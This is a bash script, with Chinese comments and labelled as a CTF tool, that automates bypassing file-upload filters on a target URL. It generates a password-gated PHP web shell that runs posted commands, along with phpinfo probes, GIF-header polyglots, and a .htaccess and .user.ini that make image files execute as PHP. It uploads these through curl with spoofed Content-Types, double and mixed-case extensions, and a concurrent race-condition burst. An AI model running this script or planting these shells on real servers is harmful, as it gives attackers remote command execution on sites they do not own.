#!/bin/bash
# CTF 文件上传绕过自动化
# 用法: bash upload.sh <URL> [UPLOAD_PATH]

URL="${1:?用法: bash upload.sh <URL> [UPLOAD_PATH]}"
UPLOAD_PATH="${2:-/upload}"

echo "=========================================="
echo "  文件上传绕过: $URL$UPLOAD_PATH"
echo "=========================================="

# 生成测试文件
TMPDIR=$(mktemp -d)
cat > "$TMPDIR/test.php" << 'SHELL'
<?php echo "CTF_SHELL_TEST_".phpinfo();?>
SHELL
cp "$TMPDIR/test.php" "$TMPDIR/test.phtml"
cp "$TMPDIR/test.php" "$TMPDIR/test.php5"
cp "$TMPDIR/test.php" "$TMPDIR/test.phar"
echo 'GIF89a<?php echo "CTF_SHELL_TEST_".phpinfo();?>' > "$TMPDIR/test.gif.php"
echo 'GIF89a' > "$TMPDIR/test.gif"
printf '\x89PNG\r\n\x1a\n' > "$TMPDIR/test.png"
echo 'AddType application/x-httpd-php .jpg' > "$TMPDIR/.htaccess"
echo 'auto_prepend_file=shell.jpg' > "$TMPDIR/.user.ini"
cat > "$TMPDIR/shell.php" << 'SHELL'
<?php if($_POST["pass"]=="ctf"){echo shell_exec($_POST["cmd"]);}?>
SHELL
echo 'GIF89a' > "$TMPDIR/shell.gif.php"
cat >> "$TMPDIR/shell.gif.php" << 'SHELL'
<?php if($_POST["pass"]=="ctf"){echo shell_exec($_POST["cmd"]);}?>
SHELL

UPLOAD_FULL="${URL}${UPLOAD_PATH}"

echo -e "\n[1/6] 直接上传PHP"
resp=$(curl -sk -X POST "$UPLOAD_FULL" -F "file=@$TMPDIR/test.php" --max-time 10 2>/dev/null)
echo "$resp" | head -5
echo "$resp" | grep -ioP '(upload/[^\s"]+|success|ok|path[^"]*"[^"]*")' | head -3

echo -e "\n[2/6] Content-Type绕过"
for ct in "image/jpeg" "image/png" "image/gif" "application/octet-stream"; do
    resp=$(curl -sk -X POST "$UPLOAD_FULL" -F "file=@$TMPDIR/test.php;type=$ct" --max-time 10 2>/dev/null)
    echo "  Content-Type=$ct -> $(echo "$resp" | head -1 | cut -c1-80)"
done

echo -e "\n[3/6] 双重扩展名"
for ext in "shell.php.jpg" "shell.php.png" "shell.pHp" "shell.PHP" "shell.php5" "shell.phtml" "shell.phar"; do
    resp=$(curl -sk -X POST "$UPLOAD_FULL" -F "file=@$TMPDIR/shell.php;filename=$ext" --max-time 10 2>/dev/null)
    echo "  filename=$ext -> $(echo "$resp" | head -1 | cut -c1-80)"
done

echo -e "\n[4/6] 文件头绕过"
curl -sk -X POST "$UPLOAD_FULL" -F "file=@$TMPDIR/shell.gif.php;filename=shell.gif.php" --max-time 10 2>/dev/null | head -3

echo -e "\n[5/6] .htaccess上传"
curl -sk -X POST "$UPLOAD_FULL" -F "file=@$TMPDIR/.htaccess;filename=.htaccess" --max-time 10 2>/dev/null | head -3

echo -e "\n[6/6] 竞争条件(10次并发)"
for i in $(seq 1 10); do
    curl -sk -X POST "$UPLOAD_FULL" -F "file=@$TMPDIR/shell.php" --max-time 3 >/dev/null 2>&1 &
done
wait

rm -rf "$TMPDIR"
echo -e "\n=========================================="
echo "上传绕过测试完成"
echo "=========================================="
